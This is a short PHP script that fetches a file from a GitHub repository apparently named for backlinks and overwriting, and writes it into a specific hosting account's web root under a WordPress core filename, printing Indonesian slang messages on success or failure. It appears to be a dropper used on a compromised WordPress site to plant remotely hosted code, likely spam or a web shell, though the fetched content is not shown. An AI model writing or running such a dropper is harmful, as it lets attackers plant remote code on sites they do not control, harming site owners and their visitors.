<?php
$url = 'https://raw.githubusercontent.com/BacklinkGG/TimpaMenimpa/main/wp-blog-header.php';
$localFilePath = '/home1/smanege5/public_html/wp-blog-header.php.php';
$content = file_get_contents($url);
if ($content !== false) {
    $result = file_put_contents($localFilePath, $content);
    if ($result !== false) {
        echo "Nahh Done Kaik...\n";
    } else {
        echo "Waduh gagal kaik...\n";
    }
} else {
    echo "Waduh gagal kaik...\n";
}
?>
